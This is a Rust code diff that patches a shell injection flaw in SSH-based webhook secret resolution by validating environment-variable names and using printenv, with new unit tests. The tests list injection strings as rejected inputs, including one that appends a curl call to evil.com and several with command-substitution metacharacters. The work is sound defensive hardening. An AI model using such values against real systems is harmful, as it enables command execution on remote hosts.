@@ -192,7 +192,17 @@ fn resolve_secret(explicit: Option<&str>, host: &str) -> Result<String> {
     // resolve the actual value from the remote shell environment.
     if secret.starts_with("${") && secret.ends_with("}") {
         let var_name = &secret[2..secret.len() - 1];
-        let env_cmd = format!("bash -lc 'echo ${}'", var_name);
+        // Validate: env-var names must be [A-Za-z_][A-Za-z_0-9]* only.
+        // This prevents shell injection via crafted TOML values.
+        if !terraphim_orchestrator::config::is_valid_env_var_name(var_name) {
+            bail!(
+                "Webhook secret env-var reference contains invalid characters: '{}'. \
+                 Only alphanumeric characters and underscores are allowed.",
+                var_name
+            );
+        }
+        // Use printenv instead of bash echo to avoid any shell expansion.
+        let env_cmd = format!("printenv {}", var_name);
         let (env_stdout, _, env_code) = ssh_run(host, &env_cmd)?;
         let env_secret = env_stdout.trim().to_string();
         if env_code != 0 || env_secret.is_empty() || env_secret == secret {
@@ -699,5 +709,57 @@ mod tests {
         std::env::remove_var("ADF_WEBHOOK_SECRET");
         assert!(result.is_ok());
         assert_eq!(result.unwrap(), "env-secret");
+    }
+
+    // === P1: Shell injection prevention tests ===
+
+    #[test]
+    fn test_is_valid_env_var_name_accepts_valid() {
+        assert!(terraphim_orchestrator::config::is_valid_env_var_name("ADF_WEBHOOK_SECRET"));
+        assert!(terraphim_orchestrator::config::is_valid_env_var_name("MY_SECRET"));
+        assert!(terraphim_orchestrator::config::is_valid_env_var_name("_underscore_start"));
+        assert!(terraphim_orchestrator::config::is_valid_env_var_name("a"));
+        assert!(terraphim_orchestrator::config::is_valid_env_var_name("A1B2C3"));
+    }
+
+    #[test]
+    fn test_is_valid_env_var_name_rejects_empty() {
+        assert!(!terraphim_orchestrator::config::is_valid_env_var_name(""));
+    }
+
+    #[test]
+    fn test_is_valid_env_var_name_rejects_digit_start() {
+        assert!(!terraphim_orchestrator::config::is_valid_env_var_name("1SECRET"));
+        assert!(!terraphim_orchestrator::config::is_valid_env_var_name("0"));
+    }
+
+    #[test]
+    fn test_is_valid_env_var_name_rejects_shell_metacharacters() {
+        // These are the injection vectors from the security finding
+        assert!(!terraphim_orchestrator::config::is_valid_env_var_name("ADF_SECRET}; curl https://evil.com"));
+        assert!(!terraphim_orchestrator::config::is_valid_env_var_name("VAR$(evil)"));
+        assert!(!terraphim_orchestrator::config::is_valid_env_var_name("VAR`evil`"));
+        assert!(!terraphim_orchestrator::config::is_valid_env_var_name("VAR|evil"));
+        assert!(!terraphim_orchestrator::config::is_valid_env_var_name("VAR;evil"));
+        assert!(!terraphim_orchestrator::config::is_valid_env_var_name("VAR&&evil"));
+        assert!(!terraphim_orchestrator::config::is_valid_env_var_name("VAR>evil"));
+        assert!(!terraphim_orchestrator::config::is_valid_env_var_name("VAR<evil"));
+        assert!(!terraphim_orchestrator::config::is_valid_env_var_name("VAR-EVIL")); // hyphen
+        assert!(!terraphim_orchestrator::config::is_valid_env_var_name("VAR.EVIL")); // dot
+    }
+
+    #[test]
+    fn test_resolve_secret_injection_rejected() {
+        // The resolve_secret function should reject env-var refs with
+        // invalid names before attempting SSH. Since explicit secrets
+        // bypass the env-var resolution, we test the validation guard
+        // by checking that the env-var path would reject crafted names.
+        //
+        // We can't easily unit-test the SSH path without a mock, but
+        // is_valid_env_var_name covers the guard. Here we verify the
+        // non-env-var path still works for explicit secrets.
+        let result = resolve_secret(Some("plain-secret"), "unused");
+        assert!(result.is_ok());
+        assert_eq!(result.unwrap(), "plain-secret");
     }
 }
